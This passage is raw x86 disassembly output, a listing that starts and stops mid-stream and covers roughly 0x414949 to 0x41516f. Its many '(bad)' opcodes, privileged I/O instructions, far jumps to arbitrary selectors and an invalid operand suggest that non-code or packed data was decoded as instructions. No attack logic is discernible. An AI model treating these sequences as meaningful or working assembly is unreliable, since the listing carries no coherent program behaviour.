  414949:	mov    BYTE PTR [ecx],0x81
  41494c:	das    
  41494d:	adc    eax,0xe4939eb9
  414952:	rcr    BYTE PTR [ecx-0x61],cl
  414955:	(bad)  
  414956:	mov    ah,0x1e
  414958:	pop    esp
  414959:	int3   
  41495a:	cwde   
  41495b:	push   esi
  41495c:	or     BYTE PTR [ebx-0x79],bh
  41495f:	imul   esi,DWORD PTR [ecx+esi*1+0x20cc132e],0x18c1d811
  41496a:	jmp    0x826d:0x98cfce99
  414971:	jno    0x4149e8
  414973:	adc    esp,edx
  414975:	and    DWORD PTR [eax-0x2cf0bb3c],0x4044546a
  41497f:	xchg   ebx,eax
  414980:	push   ss
  414981:	mov    es,WORD PTR ss:[ecx+eiz*1+0x39]
  414986:	push   esp
  414987:	jno    0x4149ff
  414989:	xchg   edx,eax
  41498a:	or     eax,0x399402ec
  41498f:	mov    ds:0x8d7649c4,al
  414994:	inc    ebx
  414995:	outs   dx,BYTE PTR ds:[esi]
  414996:	scas   eax,DWORD PTR es:[edi]
  414997:	sub    al,BYTE PTR [edx]
  414999:	and    DWORD PTR [eax-0x2],edi
  41499c:	pop    ds
  41499d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41499e:	or     al,0x7f
  4149a0:	pop    ds
  4149a1:	xlat   BYTE PTR ds:[ebx]
  4149a2:	je     0x414985
  4149a4:	jecxz  0x4149ec
  4149a6:	nop
  4149a7:	mov    esp,0x721250de
  4149ac:	adc    BYTE PTR [edx],ah
  4149ae:	in     al,0xaa
  4149b0:	push   edx
  4149b1:	aad    0xd
  4149b3:	stos   DWORD PTR es:[edi],eax
  4149b4:	sub    esi,eax
  4149b6:	lock and edx,DWORD PTR [eax+esi*1-0x3d]
  4149bb:	xchg   ecx,eax
  4149bc:	mov    dl,0x8e
  4149be:	cwde   
  4149bf:	lahf   
  4149c0:	les    ebp,FWORD PTR [edx]
  4149c2:	ror    BYTE PTR [esi-0x2],cl
  4149c5:	aas    
  4149c6:	leave  
  4149c7:	pop    eax
  4149c8:	mov    eax,0x93093b5c
  4149cd:	in     al,0x71
  4149cf:	jbe    0x414a2d
  4149d1:	adc    eax,0x19ed3e9
  4149d6:	ret    0xfc84
  4149d9:	arpl   WORD PTR [eax+0xe],dx
  4149dc:	daa    
  4149dd:	dec    edx
  4149de:	add    DWORD PTR [edi+0x22],esi
  4149e1:	inc    ebx
  4149e2:	or     ah,BYTE PTR [ecx*8-0x4ac5eb6d]
  4149e9:	push   ebp
  4149ea:	outs   dx,DWORD PTR ds:[esi]
  4149eb:	retf   
  4149ec:	mov    al,0x30
  4149ee:	mov    bl,0xb7
  4149f0:	or     al,0x3b
  4149f2:	and    eax,0x5df36f77
  4149f7:	sti    
  4149f8:	stos   DWORD PTR es:[edi],eax
  4149f9:	in     eax,0xdc
  4149fb:	sub    eax,0x28fdfba3
  414a00:	sub    eax,0x8354ec78
  414a05:	icebp  
  414a06:	xchg   edi,eax
  414a07:	pop    ebp
  414a08:	sbb    DWORD PTR [eax-0x75],ebp
  414a0b:	xor    al,0x15
  414a0d:	cmc    
  414a0e:	pop    es
  414a0f:	inc    esi
  414a10:	dec    edi
  414a11:	add    esi,DWORD PTR [esi+0x3e286120]
  414a17:	xor    ah,BYTE PTR [edi]
  414a19:	adc    DWORD PTR [edi-0x58790534],edx
  414a1f:	mov    BYTE PTR [ebp-0x2c],bh
  414a22:	xchg   ebp,eax
  414a23:	sub    cl,BYTE PTR [edi-0x20b067fa]
  414a29:	fisub  WORD PTR [ecx+0x6d79133d]
  414a2f:	dec    ebx
  414a30:	sub    BYTE PTR [edi],cl
  414a32:	mov    BYTE PTR [edx+0x15],al
  414a35:	push   ebp
  414a36:	fstp   QWORD PTR [esi+edi*4]
  414a39:	fistp  WORD PTR [esi-0x9]
  414a3c:	mov    al,ds:0xe928ec4e
  414a41:	mov    eax,0xcb1f9067
  414a46:	daa    
  414a47:	loopne 0x414a0d
  414a49:	imul   esp,DWORD PTR [esi+0xf],0xb7262706
  414a50:	ret    
  414a51:	jbe    0x4149e6
  414a53:	mov    cl,0x6e
  414a55:	mov    ebx,ecx
  414a57:	fisttp WORD PTR [esi-0x40]
  414a5a:	jecxz  0x4149e0
  414a5c:	cld    
  414a5d:	pop    esp
  414a5e:	xchg   ecx,eax
  414a5f:	mov    bl,0xab
  414a61:	(bad)  
  414a62:	fmulp  st(7),st
  414a64:	leave  
  414a65:	je     0x414a6f
  414a67:	push   0x50345e14
  414a6c:	sahf   
  414a6d:	pop    ebx
  414a6e:	mov    edx,0x7ec94e0a
  414a74:	or     ah,BYTE PTR [edi+0x2e]
  414a77:	mov    edi,0xf168d2d0
  414a7c:	mov    cl,0xce
  414a7e:	mov    ebx,0x91d0f77a
  414a83:	idiv   bh
  414a85:	pop    ecx
  414a86:	xchg   DWORD PTR [esi-0x432cf601],edx
  414a8c:	push   ds
  414a8d:	jbe    0x414a76
  414a8f:	or     al,BYTE PTR [edx+0x11]
  414a92:	cmp    eax,DWORD PTR [ebx-0x4a4f29ad]
  414a98:	rol    BYTE PTR [esi-0x178ef9a9],cl
  414a9e:	aad    0xfe
  414aa0:	and    al,0x58
  414aa2:	repz jecxz 0x414ad2
  414aa5:	jne    0x414ad9
  414aa7:	xor    ecx,DWORD PTR [ebp+0x31a49aca]
  414aad:	repz test eax,0xf9890049
  414ab3:	mov    bl,0xd1
  414ab5:	pusha  
  414ab6:	cld    
  414ab7:	and    ecx,esp
  414ab9:	add    eax,0x99437fc6
  414abe:	jge    0x414b2c
  414ac0:	pop    ebp
  414ac1:	mov    ebx,0xd280cac2
  414ac6:	stos   DWORD PTR es:[edi],eax
  414ac7:	adc    ah,ch
  414ac9:	add    BYTE PTR [edi-0x45],0xa1
  414acd:	adc    DWORD PTR [edi],ebp
  414acf:	xchg   ebx,eax
  414ad0:	mov    esp,0xf32eafe9
  414ad5:	jge    0x414aff
  414ad7:	aaa    
  414ad8:	stc    
  414ad9:	or     edx,DWORD PTR [ecx]
  414adb:	dec    esp
  414adc:	(bad)  
  414add:	pushf  
  414ade:	adc    DWORD PTR [ecx+0x4f],0xffffffd4
  414ae2:	mov    esp,esp
  414ae4:	adc    esi,edx
  414ae6:	pop    esp
  414ae7:	(bad)  
  414ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aea:	inc    eax
  414aeb:	mov    cl,0xe
  414aed:	sar    edx,0x34
  414af0:	fiadd  WORD PTR [edi+0x11]
  414af3:	ret    0x5273
  414af6:	sub    BYTE PTR [edx],0x6
  414af9:	adc    dh,bl
  414afb:	sbb    DWORD PTR [ecx+0x12d9ba58],eax
  414b01:	aas    
  414b02:	(bad)  
  414b03:	push   esp
  414b04:	push   ss
  414b05:	pop    ds
  414b06:	xor    DWORD PTR [edx],edi
  414b08:	jmp    0xb8d3dd60
  414b0d:	popa   
  414b0e:	sar    BYTE PTR [edx-0x33],cl
  414b11:	xchg   edi,eax
  414b12:	jmp    0xf5a0:0x4ff993b3
  414b19:	(bad)  
  414b1a:	adc    DWORD PTR [edi*8+0x596df328],ebp
  414b21:	repnz lea esp,[edx]
  414b24:	fptan  
  414b26:	retf   
  414b27:	fwait
  414b28:	in     eax,0xa3
  414b2a:	pop    eax
  414b2b:	cmp    al,0x60
  414b2d:	int    0x9f
  414b2f:	stos   DWORD PTR es:[edi],eax
  414b30:	idiv   BYTE PTR [edi+0x29]
  414b33:	cli    
  414b34:	ret    
  414b35:	int    0xef
  414b37:	sbb    edx,DWORD PTR [esi-0x5b]
  414b3a:	sbb    ebx,DWORD PTR [eax-0x35]
  414b3d:	adc    ch,BYTE PTR [ecx]
  414b3f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b41:	dec    eax
  414b42:	pop    ds
  414b43:	test   eax,0x3f2a374d
  414b48:	(bad)  
  414b49:	(bad)  
  414b4a:	pop    ds
  414b4b:	loopne 0x414add
  414b4d:	call   0xf02b:0x6e0b14c9
  414b54:	cmp    ah,BYTE PTR [ebx+0x75]
  414b57:	mov    dh,0x53
  414b59:	and    dl,bl
  414b5b:	adc    ah,BYTE PTR [eax-0x6accbb96]
  414b61:	(bad)  
  414b62:	arpl   sp,ax
  414b64:	pop    DWORD PTR [eax+0x56c4deb]
  414b6a:	jge    0x414b31
  414b6c:	pop    edx
  414b6d:	jmp    0x6a0232b9
  414b72:	jo     0x414b42
  414b74:	xchg   DWORD PTR [edx+0x443f50d9],ebp
  414b7a:	pop    esi
  414b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b7c:	xchg   ebp,eax
  414b7d:	loop   0x414b73
  414b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b80:	cmp    ah,ah
  414b82:	inc    ebx
  414b83:	pop    esp
  414b84:	mov    ?,WORD PTR [ebp+0x6f]
  414b87:	not    BYTE PTR [esi-0xd4c5bb8]
  414b8d:	xor    DWORD PTR [ecx],0x2dae20cf
  414b93:	test   BYTE PTR [esi],al
  414b95:	cli    
  414b96:	cmc    
  414b97:	sbb    cl,BYTE PTR [bx+0x55]
  414b9b:	rol    BYTE PTR [ebp+0x9],0xfb
  414b9f:	pop    edx
  414ba0:	ins    DWORD PTR es:[edi],dx
  414ba1:	fadd   DWORD PTR [esi]
  414ba3:	cdq    
  414ba4:	shr    esp,cl
  414ba6:	scas   eax,DWORD PTR es:[edi]
  414ba7:	jae    0x414bdc
  414ba9:	stos   DWORD PTR es:[edi],eax
  414baa:	and    dh,0xe6
  414bad:	mov    al,ds:0x3cab7e7e
  414bb2:	mov    dh,0x69
  414bb4:	pop    ecx
  414bb5:	add    edx,DWORD PTR es:[esi+0x7]
  414bb9:	into   
  414bba:	loopne 0x414b89
  414bbc:	mov    ebp,0x2a4f7d35
  414bc1:	adc    dl,dl
  414bc3:	sub    al,0xc1
  414bc5:	jge    0x414c0d
  414bc7:	lock inc edi
  414bc9:	retf   0x2b1d
  414bcc:	sub    BYTE PTR [ecx+esi*8],dl
  414bcf:	lock push ecx
  414bd1:	dec    ecx
  414bd2:	push   cs
  414bd3:	mov    BYTE PTR [eax-0x73157ac5],al
  414bd9:	inc    esi
  414bda:	cmp    al,0x9f
  414bdc:	jg     0x414bdd
  414bde:	adc    BYTE PTR [esi-0x1740b065],cl
  414be4:	ja     0x414c55
  414be6:	and    DWORD PTR [eax+0x10],0xed104328
  414bed:	adc    eax,0x12e1a645
  414bf2:	shr    ebx,cl
  414bf4:	or     eax,0xda706bea
  414bf9:	inc    edi
  414bfb:	es out dx,al
  414bfd:	mov    edx,0x13a3c32f
  414c02:	push   cs
  414c03:	js     0x414c82
  414c05:	push   ebx
  414c06:	sbb    eax,0x32a8c3a5
  414c0b:	ins    DWORD PTR es:[edi],dx
  414c0c:	stos   BYTE PTR es:[edi],al
  414c0d:	push   esp
  414c0e:	or     al,0xa8
  414c10:	mov    ebp,0xf2018e5a
  414c15:	dec    eax
  414c16:	cli    
  414c17:	cmp    dh,BYTE PTR ss:[ecx+0x58]
  414c1b:	adc    DWORD PTR [ebx+eiz*1],esi
  414c1e:	mov    dl,BYTE PTR [ebx]
  414c20:	shl    bh,1
  414c22:	cdq    
  414c23:	mov    dh,0x86
  414c25:	call   0x3feddac1
  414c2a:	sbb    eax,0xa04fa7a
  414c2f:	scas   eax,DWORD PTR es:[edi]
  414c30:	mov    ah,BYTE PTR [ebp+0x54a5681]
  414c36:	jmp    0x405b:0x4d16ae87
  414c3d:	xlat   BYTE PTR ds:[ebx]
  414c3e:	and    DWORD PTR [esp+esi*8],eax
  414c41:	gs inc DWORD PTR gs:[ebx]
  414c45:	sbb    eax,0x11b0194f
  414c4a:	sub    dl,bh
  414c4c:	push   eax
  414c4d:	mov    ch,0xaa
  414c4f:	addr16 push edx
  414c51:	fnsave [eax+esi*1]
  414c54:	enter  0x6a90,0x50
  414c58:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414c5a:	je     0x414c7d
  414c5c:	adc    esp,DWORD PTR [esi-0x43]
  414c5f:	fst    QWORD PTR [edx]
  414c61:	jecxz  0x414bf4
  414c63:	dec    eax
  414c64:	and    eax,0xa6aae7ca
  414c69:	mov    edi,0x54458d3f
  414c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c6f:	jmp    0xf779f3ac
  414c74:	jl     0x414c34
  414c76:	stos   DWORD PTR es:[edi],eax
  414c77:	jg     0x414cf1
  414c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c7a:	add    ecx,esp
  414c7c:	(bad)  
  414c7d:	mov    edx,0xa190b8b8
  414c82:	add    al,0xcf
  414c84:	xchg   BYTE PTR [edx-0x12],al
  414c87:	xchg   edi,eax
  414c88:	pop    ecx
  414c89:	add    eax,0x74755164
  414c8e:	jne    0x414c95
  414c90:	mov    esp,0x1e04683e
  414c95:	mov    al,0x5
	...
  414d13:	add    BYTE PTR [ecx],dl
  414d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d16:	pop    esi
  414d17:	xor    eax,0xa57bfffe
  414d1c:	int    0xa1
  414d1e:	ficom  WORD PTR [edx+ebp*2+0x4d]
  414d22:	lock stos BYTE PTR es:[edi],al
  414d24:	sbb    dh,bl
  414d26:	add    BYTE PTR [eax],al
  414d28:	imul   eax,DWORD PTR [edi],0x0
  414d2b:	add    BYTE PTR [ebp-0x3],cl
  414d2e:	mov    dh,0xef
  414d30:	fs inc edx
  414d32:	add    al,0x5b
  414d34:	xchg   ecx,eax
  414d35:	push   ebp
  414d36:	ins    BYTE PTR es:[edi],dx
  414d37:	cmp    al,0xd
  414d39:	std    
  414d3a:	test   eax,0x35a77bcf
  414d3f:	ja     0x414dac
  414d41:	dec    esi
  414d42:	mov    ds:0xa720b35c,al
  414d47:	xchg   esi,eax
  414d48:	dec    ebp
  414d49:	or     bl,BYTE PTR [eax-0x12d6f409]
  414d4f:	retf   0xd301
  414d52:	aam    0x2e
  414d54:	in     al,0x73
  414d56:	ror    DWORD PTR ds:0x6b9edac6,cl
  414d5c:	mov    ebp,0x89d541e5
  414d61:	cli    
  414d62:	xchg   ecx,eax
  414d63:	add    eax,0xd3924c7d
  414d68:	addr16 pop ebp
  414d6a:	pushfw 
  414d6c:	cmp    DWORD PTR ds:0xd7b30202,esp
  414d72:	adc    al,ah
  414d74:	inc    eax
  414d75:	scas   al,BYTE PTR es:[edi]
  414d76:	retf   
  414d77:	add    DWORD PTR [ebp-0x41],0xffffff8f
  414d7b:	fwait
  414d7c:	aaa    
  414d7d:	out    0xca,al
  414d7f:	jg     0x414da2
  414d81:	and    al,0x35
  414d83:	push   ebp
  414d84:	sub    al,0xcf
  414d86:	arpl   WORD PTR [ecx],ax
  414d88:	xchg   DWORD PTR [edi],edx
  414d8a:	lods   eax,DWORD PTR ds:[esi]
  414d8b:	shl    DWORD PTR [esi+eax*8+0x7edfbc3f],1
  414d92:	cmp    DWORD PTR [ecx*1-0x2eaa81e8],0xffffff8b
  414d9a:	jl     0x414dab
  414d9c:	je     0x414db8
  414d9e:	repz out dx,al
  414da0:	xor    al,0x54
  414da2:	cs push edx
  414da4:	dec    edi
  414da5:	dec    eax
  414da6:	scas   eax,DWORD PTR es:[edi]
  414da7:	or     al,0xf5
  414da9:	adc    DWORD PTR [edi],edx
  414dab:	frstpm(287 only) 
  414dad:	xlat   BYTE PTR ds:[ebx]
  414dae:	(bad)  
  414daf:	stos   DWORD PTR es:[edi],eax
  414db0:	jle    0x414d36
  414db2:	add    BYTE PTR [edx+ebp*2+0x3bcbf23b],al
  414db9:	or     dh,al
  414dbb:	scas   eax,DWORD PTR es:[edi]
  414dbc:	js     0x414e00
  414dbe:	ret    
  414dbf:	repnz aaa 
  414dc1:	ss inc esi
  414dc3:	cli    
  414dc4:	test   BYTE PTR [edi+ebx*1+0x6],al
  414dc8:	mov    ds:0x2dcb4836,eax
  414dcd:	repnz stc 
  414dcf:	inc    ebp
  414dd0:	dec    ebx
  414dd1:	std    
  414dd2:	ret    
  414dd3:	mov    eax,ds:0x76836a17
  414dd8:	lahf   
  414dd9:	cmp    al,0xc8
  414ddb:	fadd   QWORD PTR [eax]
  414ddd:	pop    DWORD PTR [edi-0x23cfdaea]
  414de3:	inc    esi
  414de4:	pop    eax
  414de5:	lods   al,BYTE PTR ds:[esi]
  414de6:	jecxz  0x414dba
  414de8:	cmp    DWORD PTR [esp+ebp*8],esp
  414deb:	xor    bl,BYTE PTR [eax+0x19]
  414dee:	jg     0x414deb
  414df0:	pop    edi
  414df1:	pop    ds
  414df2:	outs   dx,DWORD PTR ds:[esi]
  414df3:	and    edx,esp
  414df5:	jne    0x414e26
  414df7:	loop   0x414e1d
  414df9:	pop    ds
  414dfa:	popf   
  414dfb:	fwait
  414dfc:	int3   
  414dfd:	jns    0x414e4a
  414dff:	pshufw mm0,QWORD PTR [eax],0x24
  414e03:	aam    0x51
  414e05:	ss cmp eax,0xf30d9e6c
  414e0b:	cmp    DWORD PTR ds:0x6ee139a6,edx
  414e11:	ins    BYTE PTR es:[edi],dx
  414e12:	pop    esi
  414e13:	dec    eax
  414e14:	fild   WORD PTR [ecx+eiz*8+0x7a]
  414e18:	xchg   edx,eax
  414e19:	clc    
  414e1a:	xchg   ebp,eax
  414e1b:	loop   0x414e7b
  414e1d:	jne    0x414e42
  414e1f:	or     esi,DWORD PTR [ebp-0x1887f493]
  414e25:	rcl    BYTE PTR [ebx],cl
  414e27:	jmp    0xe5906955
  414e2c:	lods   eax,DWORD PTR ds:[esi]
  414e2d:	mov    esp,0x1c039483
  414e32:	call   0xd0be:0x3d235efa
  414e39:	ss xchg esi,eax
  414e3b:	pop    ds
  414e3c:	les    ebp,FWORD PTR [ebx+0x7a550fe]
  414e42:	xchg   esi,eax
  414e43:	push   ds
  414e44:	push   ecx
  414e45:	outs   dx,DWORD PTR ds:[esi]
  414e46:	push   es
  414e47:	xchg   edx,eax
  414e48:	push   0x69077454
  414e4d:	mov    cl,0x99
  414e4f:	mov    ebp,0x963ae957
  414e54:	sahf   
  414e55:	out    dx,eax
  414e56:	fsubr  QWORD PTR fs:[ebx+0x47]
  414e5a:	push   es
  414e5b:	aas    
  414e5c:	push   edx
  414e5d:	mov    ebp,0xc426a532
  414e62:	sbb    ecx,DWORD PTR ds:0x59341ed0
  414e68:	mov    edx,0xa6d7615c
  414e6d:	ja     0x414e3f
  414e6f:	inc    ecx
  414e70:	pop    ds
  414e71:	sub    dl,dh
  414e73:	arpl   si,bx
  414e75:	push   esi
  414e76:	jg     0x414ef2
  414e78:	lea    esi,[edx-0x30]
  414e7b:	outs   dx,BYTE PTR ds:[esi]
  414e7c:	sahf   
  414e7d:	pop    ds
  414e7e:	fld    TBYTE PTR [edi-0x779a470]
  414e85:	sbb    cl,BYTE PTR [esi+edi*4]
  414e88:	dec    ebx
  414e89:	fbstp  TBYTE PTR [edi]
  414e8b:	sub    al,0x1c
  414e8d:	(bad)  
  414e8e:	mov    cs,WORD PTR [eax-0x49]
  414e91:	inc    esi
  414e92:	pop    ecx
  414e93:	cld    
  414e94:	pop    eax
  414e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e96:	jmp    0x414e2e
  414e98:	cmp    eax,0x705ca25d
  414e9d:	retf   0x713e
  414ea0:	jmp    0x17a76511
  414ea5:	sti    
  414ea6:	out    0xac,al
  414ea8:	hlt    
  414ea9:	mov    dh,0xb5
  414eab:	test   al,0x98
  414ead:	stos   BYTE PTR es:[edi],al
  414eae:	fdiv   QWORD PTR [esi-0x17]
  414eb1:	push   edx
  414eb2:	jo     0x414e50
  414eb4:	je     0x414e8a
  414eb6:	xor    DWORD PTR [edx-0xf],ecx
  414eb9:	pop    ebx
  414eba:	mov    ah,0x89
  414ebc:	sub    DWORD PTR [esi+0x61fcc7c0],0xd020e6a
  414ec6:	jae    0x414e77
  414ec8:	dec    edi
  414ec9:	lock fbld TBYTE PTR [ecx-0x1ba2f4a3]
  414ed0:	das    
  414ed1:	and    cl,dl
  414ed3:	(bad)  
  414ed4:	sub    bh,dl
  414ed6:	mov    ch,0x45
  414ed8:	sub    dh,bl
  414eda:	pop    ss
  414edb:	jmp    0x414edb
  414edd:	pop    ebp
  414ede:	imul   ebx,DWORD PTR [ecx+ebp*8],0x6a
  414ee2:	sub    al,0x7c
  414ee4:	sbb    eax,0x634dee9f
  414ee9:	or     edx,DWORD PTR [edx-0x71fbfed1]
  414eef:	inc    eax
  414ef0:	adc    DWORD PTR [edi+0x59],ebx
  414ef3:	dec    edx
  414ef4:	lea    eax,[esp+ecx*1-0x39]
  414ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef9:	test   al,0xb
  414efb:	or     eax,0xb14d9fd3
  414f00:	(bad)  [ecx+0x42457b86]
  414f06:	scas   eax,DWORD PTR es:[edi]
  414f07:	xchg   esp,eax
  414f08:	repz test BYTE PTR [ecx-0x3b],al
  414f0c:	cmc    
  414f0d:	rol    BYTE PTR [ecx+0x76],1
  414f10:	int    0x4f
  414f12:	neg    DWORD PTR [eax-0x5da45869]
  414f18:	jge    0x414f08
  414f1a:	int    0xbb
  414f1c:	mov    al,0x17
  414f1e:	adc    BYTE PTR [ebx],bl
  414f20:	aaa    
  414f21:	fxch   st(6)
  414f23:	add    al,0x85
  414f25:	and    DWORD PTR [ebp-0x27],edi
  414f28:	mov    cl,0x78
  414f2a:	gs popa 
  414f2c:	jbe    0x414f54
  414f2e:	cmp    ebx,DWORD PTR [ecx+0x79]
  414f31:	cdq    
  414f32:	xor    DWORD PTR [edx+0x6f],esi
  414f35:	adc    DWORD PTR [esi+0x63],0x9604bec5
  414f3c:	mov    ecx,0x729322b8
  414f41:	loope  0x414f17
  414f43:	int    0xb1
  414f45:	lock sub BYTE PTR [ecx+edi*8+0x45],bh
  414f4a:	js     0x414fa9
  414f4c:	jmp    0x414fa4
  414f4e:	add    BYTE PTR [eax+0x55a27251],cl
  414f54:	pop    esp
  414f55:	out    dx,al
  414f56:	jp     0x414f0f
  414f58:	clc    
  414f59:	fstp   QWORD PTR [ebp+ebp*8+0x5b]
  414f5d:	push   esp
  414f5e:	inc    edi
  414f5f:	push   0xc0cac9f1
  414f64:	mov    cl,0x54
  414f66:	loop   0x414f8a
  414f68:	push   ebx
  414f69:	or     eax,0x839d5fc3
  414f6e:	adc    eax,0x3707f2bd
  414f73:	ror    BYTE PTR [ebp+0x3e],1
  414f76:	pop    ecx
  414f77:	cdq    
  414f78:	hlt    
  414f79:	push   ecx
  414f7a:	leave  
  414f7b:	jg     0x414fe4
  414f7d:	mul    BYTE PTR [edi-0x566e7cbb]
  414f83:	or     eax,0xfcbc8f27
  414f88:	(bad)  
  414f89:	mov    ebx,0x479bf9d0
  414f8e:	dec    esi
  414f8f:	sbb    DWORD PTR [ebp+0x3071b5b8],ebx
  414f95:	daa    
  414f96:	mov    ebp,0x136321b5
  414f9b:	pop    esp
  414f9c:	xchg   BYTE PTR [eax],bl
  414f9e:	aas    
  414f9f:	dec    ebp
  414fa0:	ret    
  414fa1:	mov    BYTE PTR [ebp+0x5e],0xcc
  414fa5:	in     al,0xd7
  414fa7:	mov    al,ds:0xb6f866a1
  414fac:	mov    al,cl
  414fae:	imul   edi,DWORD PTR ds:0xb0bf8a44,0xccd9ae22
  414fb8:	sbb    bh,BYTE PTR [edx+eiz*8]
  414fbb:	outs   dx,BYTE PTR ds:[esi]
  414fbc:	adc    al,0x21
  414fbe:	push   ss
  414fbf:	adc    DWORD PTR [eax-0xd],0xb
  414fc3:	pop    edx
  414fc4:	sti    
  414fc5:	cmp    eax,0x3541450d
  414fca:	cs add eax,0xad289709
  414fd0:	pop    edi
  414fd1:	sbb    BYTE PTR [ebp-0x72],cl
  414fd4:	loopne 0x414fe6
  414fd6:	dec    ebx
  414fd7:	dec    esp
  414fd8:	xor    ebp,DWORD PTR [ebp-0x18b6b0b6]
  414fde:	jbe    0x414f88
  414fe0:	jp     0x41500f
  414fe2:	mov    dh,0x74
  414fe4:	xor    bh,al
  414fe6:	bound  edi,QWORD PTR [esi+ecx*2+0x226d728d]
  414fed:	push   esi
  414fee:	repnz mov eax,ds:0x1d90c592
  414ff4:	fcom   QWORD PTR [edi+eiz*2-0x6e22a152]
  414ffb:	ret    
  414ffc:	shl    BYTE PTR [edi],cl
  414ffe:	lea    ecx,[ecx+0x2d]
  415001:	repz jl 0x414f86
  415004:	rcl    BYTE PTR [ecx-0x68],1
  415007:	cmp    eax,0x3ec5634e
  41500c:	jle    0x41500d
  41500e:	(bad)  [esi+0x4c]
  415011:	or     edx,ebx
  415013:	addr16 das 
  415015:	mov    eax,0x77cfe487
  41501a:	inc    esi
  41501b:	mov    ds:0x10372cb3,eax
  415020:	cmp    BYTE PTR [ebp+0x4b0ffe33],bl
  415026:	rcr    BYTE PTR ds:0xc03d619c,0xbd
  41502d:	rsqrtps xmm4,XMMWORD PTR [eax-0x25]
  415031:	pusha  
  415032:	stc    
  415033:	stos   BYTE PTR es:[edi],al
  415034:	or     al,0x46
  415036:	jl     0x414fc4
  415038:	aam    0x3c
  41503a:	cld    
  41503b:	aad    0x87
  41503d:	dec    ebx
  41503e:	mov    dl,0x38
  415040:	jmp    DWORD PTR [edi-0x1c7fc7db]
  415046:	or     ah,al
  415048:	sub    eax,0x11ff51e0
  41504d:	fstp   QWORD PTR [eax+eax*8+0x1]
  415051:	pop    ds
  415052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415053:	jnp    0x415055
  415055:	inc    ebx
  415056:	retf   0xef9f
  415059:	mov    ebp,0x5c7347b0
  41505e:	xchg   ecx,eax
  41505f:	in     eax,dx
  415060:	sub    eax,0xd0cad967
  415065:	add    dl,BYTE PTR [edx-0x7272010e]
  41506b:	mov    eax,ds:0xf6d59100
  415070:	add    DWORD PTR [edx],eax
  415072:	stc    
  415073:	shl    BYTE PTR [esi+0x30],1
  415076:	sbb    DWORD PTR [ebp+0x74752335],ebp
  41507c:	cmp    bl,ch
  41507e:	aaa    
  41507f:	cld    
  415080:	or     ebx,ebp
  415082:	jnp    0x415037
  415084:	mov    dh,0xca
  415086:	cmp    eax,0xfa4bfb7
  41508b:	stos   DWORD PTR es:[edi],eax
  41508c:	(bad)  
  41508d:	inc    BYTE PTR [edx+0x665af887]
  415093:	in     al,dx
  415094:	fmulp  st(5),st
  415096:	add    al,0x7d
  415098:	cmp    eax,0x21ae8a68
  41509d:	and    al,0xa5
  41509f:	mov    dh,bh
  4150a1:	test   DWORD PTR [edx-0x2ece713f],edi
  4150a7:	pop    es
  4150a8:	mov    cl,0x6f
  4150aa:	jmp    FWORD PTR [ecx+edi*1-0x36]
  4150ae:	rcl    dh,0x4a
  4150b1:	xlat   BYTE PTR ds:[ebx]
  4150b2:	sbb    ebx,DWORD PTR [edx]
  4150b4:	xor    DWORD PTR [eax-0x6e],ecx
  4150b7:	cmp    DWORD PTR [eax+edx*8],0xfe41dd86
  4150be:	sub    DWORD PTR [ebp-0x53e6cd6a],edi
  4150c4:	data16 jne 0x4150eb
  4150c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150c8:	ds mov cl,0xaf
  4150cb:	mov    bh,0xbb
  4150cd:	jb     0x415053
  4150cf:	mov    DWORD PTR [esi+esi*8],esi
  4150d2:	imul   ebx,edx,0x44b3c6ef
  4150d8:	cmc    
  4150d9:	inc    ebp
  4150da:	sar    DWORD PTR [esi-0x5b],cl
  4150dd:	pop    ecx
  4150de:	js     0x415115
  4150e0:	jg     0x41515f
  4150e2:	jo     0x41509a
  4150e4:	xchg   edx,eax
  4150e5:	fst    QWORD PTR [ebx-0x3c31c746]
  4150eb:	push   ebx
  4150ec:	add    DWORD PTR [ecx-0x5b116075],esp
  4150f2:	fistp  QWORD PTR [ebp+0x3]
  4150f5:	enter  0x4d70,0x68
  4150f9:	dec    ebp
  4150fa:	loope  0x415082
  4150fc:	lock xor ebx,DWORD PTR [ecx]
  4150ff:	push   edx
  415100:	popf   
  415101:	lods   al,BYTE PTR ds:[esi]
  415102:	sbb    esi,eax
  415104:	sti    
  415105:	pop    eax
  415106:	add    ebp,DWORD PTR [ebx]
  415108:	sbb    DWORD PTR [ecx],eax
  41510a:	cmp    bl,BYTE PTR [edi+0x47]
  41510d:	stos   BYTE PTR es:[edi],al
  41510e:	sbb    bh,BYTE PTR [ebp+0x6454a937]
  415114:	fidivr WORD PTR [edx-0x40]
  415117:	mov    dl,BYTE PTR [edx-0x7e25c066]
  41511d:	push   esi
  41511e:	(bad)  
  415120:	test   eax,0x95020aee
  415125:	or     ah,ah
  415127:	lea    esp,ds:0x45957aac
  41512d:	clc    
  41512e:	mov    cl,dh
  415130:	add    BYTE PTR [eax-0x3b],ah
  415133:	icebp  
  415134:	aam    0xf
  415136:	loopne 0x41517b
  415138:	push   0x62218614
  41513d:	sub    dh,bh
  41513f:	fst    QWORD PTR ds:[ebx]
  415142:	or     DWORD PTR [edx+0x7e],ecx
  415145:	ins    DWORD PTR es:[edi],dx
  415146:	dec    edx
  415147:	(bad)  
  415148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415149:	xor    eax,0xa3e3a454
  41514e:	xchg   ebx,edx
  415150:	(bad)  
  415151:	dec    dx
  415153:	lods   al,BYTE PTR ds:[si]
  415155:	jne    0x4150fb
  415157:	outs   dx,DWORD PTR ds:[esi]
  415158:	jne    0x415113
  41515a:	jp     0x415144
  41515c:	shr    DWORD PTR [ebp-0x3c],0x62
  415160:	aad    0xae
  415162:	(bad)  
  415163:	lods   al,BYTE PTR ds:[esi]
  415164:	cdq    
  415165:	xchg   BYTE PTR [ecx],al
  415167:	pop    esp
  415168:	call   0x140e:0x19748401
  41516f:	pop    ecx
